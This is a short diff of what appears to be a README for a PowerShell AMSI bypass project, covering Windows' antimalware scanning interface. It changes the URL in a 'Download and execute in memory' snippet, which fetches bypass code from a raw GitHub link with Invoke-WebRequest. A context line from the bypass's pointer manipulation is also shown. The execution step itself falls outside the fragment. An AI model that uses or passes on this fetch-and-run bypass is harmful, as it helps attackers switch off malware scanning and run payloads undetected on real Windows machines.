@@ -30,7 +30,9 @@ $ptr= [System.IntPtr]::Add([System.IntPtr]$g, 0x8);
 
 <b>Download and execute in memory</b>
 ```
-$url = 'https://raw.githubusercontent.com/MattSteedWork/Snip3/refs/heads/main/AMSIBypassWin10' 
+# Replace with Win11 link if needed
+$url = 'https://raw.githubusercontent.com/MattSteedWork/AMSI-Bypass-Win10-11/refs/heads/main/AmsiBypassWin10'
+
 $response = Invoke-WebRequest -Uri $url -UseBasicParsing
 $content = $response.Content
 
